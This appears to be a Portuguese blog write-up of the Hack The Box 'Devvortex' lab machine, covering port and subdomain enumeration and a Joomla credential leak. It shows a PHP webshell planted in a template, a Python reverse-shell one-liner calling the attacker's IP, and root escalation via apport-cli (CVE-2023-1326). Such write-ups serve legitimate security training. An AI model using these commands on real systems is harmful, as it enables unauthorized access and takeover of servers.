---
description: CTF do Hack The Box como fiz e anotações.
title: HackTheBox - Devvortex - Facíl
date: 2024-02-07 23:15:00 +/-0300
categories: [CTF, HackTheBox]
tags: [ctf, hackthebox, linux, web, sudo, facil, ]     # TAG names should always be lowercase
show_image_post: true
---
![logo](/assets/img/devvortex.png){: w="100" h="100" .left}

---
# **CTF - Devvortex**
---
---
## **Enumeração**

### nmap

```shell
─      ~/HTB/devvortex             
╰─ sudo nmap -sV -Pn -sS  --min-rate 5000 -stats-every 7s -p- 10.10.11.242 -oN nmap                          

[sudo] password for kali: 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-05 22:18 -03
Nmap scan report for 10.10.11.242
Host is up (0.22s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.55 seconds
```
{: .nolineno }

Domínio `devvortex.htb` adicionado ao /etc/hosts  
Porta 80 esse site:  
![alt text](/assets/img/devvortex1.png)  

Gobuster dir sem resultados além do que existe.

### ffuf subdomínios

```shell
╭─      ~                
╰─ ffuf -c -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 200 -u http://devvortex.htb -H 'HOST: FUZZ.devvortex.htb' -fs 154

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://devvortex.htb
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.devvortex.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 200
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 154
________________________________________________

dev                     [Status: 200, Size: 23221, Words: 5081, Lines: 502, Duration: 191ms]
:: Progress: [114441/114441] :: Job [1/1] :: 1404 req/sec :: Duration: [0:01:43] :: Errors: 0 ::
```
{: .nolineno }

Encontrado `dev.devvortex.htb` adicionado ao /etc/hosts  
Outro site:  
![alt text](/assets/img/devvortex2.png)  

### gobuster em dev.devvortex.htb

```shell
╭─      ~  
╰─ gobuster dir -u dev.devvortex.htb -t 100 -e -w /usr/share/wordlists/dirb/big.txt -x php,txt,html -r --no-error -e
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://dev.devvortex.htb
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
http://dev.devvortex.htb/.bash_history.html   (Status: 403) [Size: 162]
http://dev.devvortex.htb/.bash_history        (Status: 403) [Size: 162]
http://dev.devvortex.htb/.cvs                 (Status: 403) [Size: 162]
http://dev.devvortex.htb/.cvs.txt             (Status: 403) [Size: 162]
http://dev.devvortex.htb/.cvs.html            (Status: 403) [Size: 162]
http://dev.devvortex.htb/.cvsignore           (Status: 403) [Size: 162]
http://dev.devvortex.htb/.bash_history.txt    (Status: 403) [Size: 162]
http://dev.devvortex.htb/.bashrc.txt          (Status: 403) [Size: 162]
http://dev.devvortex.htb/.bashrc.html         (Status: 403) [Size: 162]
http://dev.devvortex.htb/.cvsignore.txt       (Status: 403) [Size: 162]
http://dev.devvortex.htb/.history             (Status: 403) [Size: 162]
http://dev.devvortex.htb/.forward             (Status: 403) [Size: 162]
http://dev.devvortex.htb/.cvsignore.html      (Status: 403) [Size: 162]
http://dev.devvortex.htb/.history.txt         (Status: 403) [Size: 162]
http://dev.devvortex.htb/.forward.html        (Status: 403) [Size: 162]
http://dev.devvortex.htb/.history.html        (Status: 403) [Size: 162]
http://dev.devvortex.htb/.listing.txt         (Status: 403) [Size: 162]
http://dev.devvortex.htb/.htpasswd.txt        (Status: 403) [Size: 162]
http://dev.devvortex.htb/.passwd.txt          (Status: 403) [Size: 162]
http://dev.devvortex.htb/.listing             (Status: 403) [Size: 162]
http://dev.devvortex.htb/.forward.txt         (Status: 403) [Size: 162]
http://dev.devvortex.htb/.passwd              (Status: 403) [Size: 162]
http://dev.devvortex.htb/.htaccess            (Status: 403) [Size: 162]
http://dev.devvortex.htb/.htaccess.txt        (Status: 403) [Size: 162]
http://dev.devvortex.htb/.htaccess.html       (Status: 403) [Size: 162]
http://dev.devvortex.htb/.htpasswd.html       (Status: 403) [Size: 162]
http://dev.devvortex.htb/.htpasswd            (Status: 403) [Size: 162]
http://dev.devvortex.htb/.perf                (Status: 403) [Size: 162]
http://dev.devvortex.htb/.passwd.html         (Status: 403) [Size: 162]
http://dev.devvortex.htb/.profile             (Status: 403) [Size: 162]
http://dev.devvortex.htb/.profile.html        (Status: 403) [Size: 162]
http://dev.devvortex.htb/.rhosts              (Status: 403) [Size: 162]
http://dev.devvortex.htb/.perf.txt            (Status: 403) [Size: 162]
http://dev.devvortex.htb/.perf.html           (Status: 403) [Size: 162]
http://dev.devvortex.htb/.rhosts.html         (Status: 403) [Size: 162]
http://dev.devvortex.htb/.ssh.txt             (Status: 403) [Size: 162]
http://dev.devvortex.htb/.subversion          (Status: 403) [Size: 162]
http://dev.devvortex.htb/.subversion.txt      (Status: 403) [Size: 162]
http://dev.devvortex.htb/.svn                 (Status: 403) [Size: 162]
http://dev.devvortex.htb/.svn.html            (Status: 403) [Size: 162]
http://dev.devvortex.htb/.web                 (Status: 403) [Size: 162]
http://dev.devvortex.htb/.rhosts.txt          (Status: 403) [Size: 162]
http://dev.devvortex.htb/.svn.txt             (Status: 403) [Size: 162]
http://dev.devvortex.htb/.web.html            (Status: 403) [Size: 162]
http://dev.devvortex.htb/.web.txt             (Status: 403) [Size: 162]
http://dev.devvortex.htb/.bashrc              (Status: 403) [Size: 162]
http://dev.devvortex.htb/.ssh.html            (Status: 403) [Size: 162]
http://dev.devvortex.htb/.ssh                 (Status: 403) [Size: 162]
http://dev.devvortex.htb/.profile.txt         (Status: 403) [Size: 162]
http://dev.devvortex.htb/.listing.html        (Status: 403) [Size: 162]
http://dev.devvortex.htb/.subversion.html     (Status: 403) [Size: 162]
http://dev.devvortex.htb/LICENSE.txt          (Status: 200) [Size: 18092]
http://dev.devvortex.htb/README.txt           (Status: 200) [Size: 4942]
http://dev.devvortex.htb/administrator        (Status: 200) [Size: 12211]
http://dev.devvortex.htb/cache                (Status: 200) [Size: 31]
http://dev.devvortex.htb/cgi-bin/.txt         (Status: 403) [Size: 162]
http://dev.devvortex.htb/cgi-bin/.html        (Status: 403) [Size: 162]
http://dev.devvortex.htb/cli                  (Status: 200) [Size: 31]
http://dev.devvortex.htb/components           (Status: 200) [Size: 31]
http://dev.devvortex.htb/configuration.php    (Status: 200) [Size: 0]
http://dev.devvortex.htb/home                 (Status: 200) [Size: 23221]
http://dev.devvortex.htb/htaccess.txt         (Status: 200) [Size: 6858]
http://dev.devvortex.htb/images               (Status: 200) [Size: 31]
http://dev.devvortex.htb/includes             (Status: 200) [Size: 31]
http://dev.devvortex.htb/index.php            (Status: 200) [Size: 23221]
http://dev.devvortex.htb/language             (Status: 200) [Size: 31]
http://dev.devvortex.htb/layouts              (Status: 200) [Size: 31]
http://dev.devvortex.htb/libraries            (Status: 200) [Size: 31]
http://dev.devvortex.htb/media                (Status: 200) [Size: 31]
http://dev.devvortex.htb/modules              (Status: 200) [Size: 31]
http://dev.devvortex.htb/plugins              (Status: 200) [Size: 31]
Progress: 57388 / 81880 (70.09%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 57394 / 81880 (70.10%)
===============================================================
Finished
===============================================================
```
{: .nolineno }

Encontrado esse arquivo txt que diz sobre aplicação Joombla.
![alt text](/assets/img/devvortex3.png)  

Encontrado pagina de login:  
`http://dev.devvortex.htb/administrator`  
![alt text](/assets/img/devvortex4.png)

`robots.txt`  

```text
# If the Joomla site is installed within a folder
# eg www.example.com/joomla/ then the robots.txt file
# MUST be moved to the site root
# eg www.example.com/robots.txt
# AND the joomla folder name MUST be prefixed to all of the
# paths.
# eg the Disallow rule for the /administrator/ folder MUST
# be changed to read
# Disallow: /joomla/administrator/
#
# For more information about the robots.txt standard, see:
# https://www.robotstxt.org/orig.html

User-agent: *
Disallow: /administrator/
Disallow: /api/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/
```
{: .nolineno }

Pesquisando sobre vulnerabilidade do Joomla 4.2 encontrei diversos exploits.
optei por ler esse site:
<https://vulncheck.com/blog/joomla-for-rce>

Acessando a URL `http://dev.devvortex.htb/api/index.php/v1/config/application?public=true` é possível obter credenciais.  

![alt text](/assets/img/devvortex5.png)  

Com essas é possível logar na página de login.
## **Acesso**
É possível editar os templates e adicionar uma webshell, bem parecido com wordpress. Optei por editar a página error.php e adicionei o código PHP `<?php echo shell_exec($_GET["cmd"]); ?>`  
![alt text](/assets/img/devvortex6.png)

Só acessar e usar a webshell `http://dev.devvortex.htb/templates/cassiopeia/error.php?cmd=ls`  
Chequei se tinha python na box, e usei `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.161",4443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'`
para executa reverse shell.  
## **Exploração**
![alt text](/assets/img/devvortex7.png)  
Na home existe apenas a pasta do outro usuário, logan.
Obtive hash de usuário logan no mysql com as credenciais de lewis.
![alt text](/assets/img/devvortex8.png)
### Crackeando a hash com john
![alt text](/assets/img/devvortex9.png)

### Primeira Flag
As credenciais de logan permitiu login via ssh.
![alt text](/assets/img/devvortex10.png)

## **Escalação de privilégio**

```shell
logan@devvortex:~$ sudo -l
Matching Defaults entries for logan on devvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User logan may run the following commands on devvortex:
    (ALL : ALL) /usr/bin/apport-cli
logan@devvortex:~$ 
```
{: .nolineno }

Pesquisei como escalar privilégio com apport-cli
Encontrei `CVE-2023-1326-PoC` onde afeta a versão 2.26.0 ou menores.
<https://github.com/diego-tella/CVE-2023-1326-PoC>

`logan@devvortex:~$ sudo /usr/bin/apport-cli --version
2.20.11`

Precisamos de um arquivo de dump .crash pra poder abusar da vulnerabilidade, para gerar eu usei ps aux escolhi um pid aleatório e executei o comando pra gerar.
Caso der algum erro escolha outro pid.

- `sudo /usr/bin/apport-cli -pid 2929 --save xd.crash`
- `sudo /usr/bin/apport-cli -c xd.crash`
- `Aperte V`
- `!/bin/bash`
- `Aperte Enter`   
  
![alt text](/assets/img/devvortex11.png)

### Segunda Flag

![alt text](/assets/img/devvortex12.png)

**Conhecimentos adquiridos:**
- Sobre os CVE

![alt text](/assets/img/devvortex13.png)